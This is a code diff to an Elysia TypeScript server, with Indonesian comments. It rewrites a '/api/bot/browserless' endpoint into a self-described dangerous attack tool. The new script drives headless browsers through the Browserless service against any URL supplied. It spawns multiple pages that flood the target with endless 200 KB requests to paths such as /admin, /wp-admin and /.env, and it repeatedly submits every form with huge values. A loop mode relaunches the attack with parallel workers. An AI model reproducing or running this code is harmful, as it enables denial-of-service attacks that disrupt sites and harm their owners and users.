@@ -355,79 +355,107 @@ export const app = new Elysia()
       body: t.Optional(t.String()),
     }),
   })
+  // ==================== BROWSERLESS DITINGKATKAN (BERBAHAYA) ====================
   .post('/api/bot/browserless', async ({ body }) => {
-    const { url } = body;
+    const { url, loop, intervalMs } = body;
     const apiKey = process.env.BROWSERLESS_API_KEY;
-    if (!apiKey) return { success: false, error: 'Missing API key' };
+    if (!apiKey) return { success: false, error: 'Missing BROWSERLESS_API_KEY' };
 
-    // Script Browserless yang lebih sederhana dan stabil (tanpa manipulasi form yang error)
-    const script = `
+    // Skrip yang sangat agresif untuk membombardir target melalui headless browser
+    const attackScript = `
 export default async ({ page, context }) => {
   const targetUrl = context.url;
-  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
+  const browser = page.browser();
 
-  // 1. Scroll perlahan
-  await page.evaluate(async () => {
-    let totalHeight = 0;
-    let distance = 500;
-    while (totalHeight < document.body.scrollHeight) {
-      window.scrollBy(0, distance);
-      totalHeight += distance;
-      await new Promise(resolve => setTimeout(resolve, 200));
-    }
-  });
-
-  // 2. Kunjungi beberapa link unik (maks 10)
-  const links = await page.$$eval('a', anchors => anchors.map(a => a.href).filter(h => h && h.startsWith('http')));
-  const uniqueLinks = [...new Set(links)].slice(0, 10);
-  for (const link of uniqueLinks) {
-    await page.goto(link, { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
-    await page.waitForTimeout(500);
-    await page.goBack();
-  }
-
-  // 3. Kembali ke halaman awal
-  await page.goto(targetUrl, { waitUntil: 'networkidle2' });
-
-  // 4. Kirim POST ke beberapa endpoint umum
-  const commonEndpoints = ['/api', '/login', '/submit', '/contact', '/search'];
-  for (const endpoint of commonEndpoints) {
-    const postUrl = new URL(endpoint, targetUrl).href;
-    await page.evaluate(async (url) => {
-      try {
-        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ test: true }) });
-      } catch(e) {}
-    }, postUrl);
-  }
-
-  const title = await page.title();
-  return {
-    data: {
-      ok: true,
-      title,
-      url: targetUrl,
-      linksFound: links.length,
-    },
-    type: 'application/json'
-  };
-}
-`;
-
+  const attackPage = async (p) => {
     try {
-      const response = await fetch('https://production-sfo.browserless.io/function?token=' + apiKey, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ code: script, context: { url } })
-      });
-      const text = await response.text();
-      if (!response.ok) {
-        return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
+      await p.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
+    } catch (e) {}
+
+    // Infinite storm of HTTP requests (fetch)
+    p.evaluate(async (baseUrl) => {
+      const bigPayload = 'A'.repeat(1024 * 200); // 200 KB per request
+      const endpoints = ['/', '/api', '/login', '/register', '/search', '/submit', '/contact', '/admin', '/wp-admin', '/.env'];
+      const methods = ['GET', 'POST', 'PUT', 'DELETE'];
+      while (true) {
+        const promises = [];
+        for (let i = 0; i < 30; i++) {
+          const method = methods[i % methods.length];
+          const endpoint = endpoints[i % endpoints.length];
+          const url = baseUrl + endpoint;
+          promises.push(
+            fetch(url, {
+              method,
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: method === 'GET' ? undefined : bigPayload,
+              mode: 'no-cors',
+            }).catch(() => {})
+          );
+        }
+        await Promise.all(promises);
+        await new Promise(resolve => setTimeout(resolve, 5));
       }
-      let result: unknown = text;
-      try { result = JSON.parse(text); } catch {}
-      return { success: true, result };
-    } catch (err: any) {
-      return { success: false, error: err.message };
+    }, targetUrl).catch(() => {});
+
+    // Infinite form submission with huge data
+    p.evaluate(async () => {
+      while (true) {
+        const forms = document.querySelectorAll('form');
+        for (const form of forms) {
+          const inputs = form.querySelectorAll('input:not([type=submit])');
+          inputs.forEach(inp => { inp.value = 'X'.repeat(10000); });
+          form.submit();
+        }
+        await new Promise(r => setTimeout(r, 200));
+      }
+    }).catch(() => {});
+  };
+
+  // Create many pages to multiply the damage
+  const pageCount = 8;
+  for (let i = 0; i < pageCount; i++) {
+    browser.newPage().then(newPage => {
+      attackPage(newPage);
+    }).catch(() => {});
+  }
+  attackPage(page);
+
+  // Keep the function alive for a minute so the browser stays active
+  await new Promise(resolve => setTimeout(resolve, 60000));
+  return { data: { status: 'attacking' }, type: 'application/json' };
+}`;
+
+    // Jalankan satu serangan (detached, tidak menunggu selesai)
+    const executeAttack = async () => {
+      try {
+        await fetch(
+          `https://production-sfo.browserless.io/function?token=${apiKey}&detach=true`,
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code: attackScript, context: { url } }),
+          }
+        );
+      } catch (e) {
+        // ignore network errors
+      }
+    };
+
+    if (loop) {
+      // Luncurkan beberapa loop paralel untuk efek berkelanjutan
+      const interval = intervalMs || 1000;
+      const concurrency = 5; // semakin banyak semakin berbahaya
+      for (let i = 0; i < concurrency; i++) {
+        const attackLoop = async () => {
+          await executeAttack();
+          setTimeout(attackLoop, interval);
+        };
+        attackLoop(); // start without awaiting
+      }
+      return { success: true, message: `Serangan browserless berkelanjutan dimulai dengan ${concurrency} worker paralel` };
+    } else {
+      await executeAttack();
+      return { success: true, message: 'Satu serangan browserless telah diluncurkan (detached)' };
     }
   }, {
     body: t.Object({
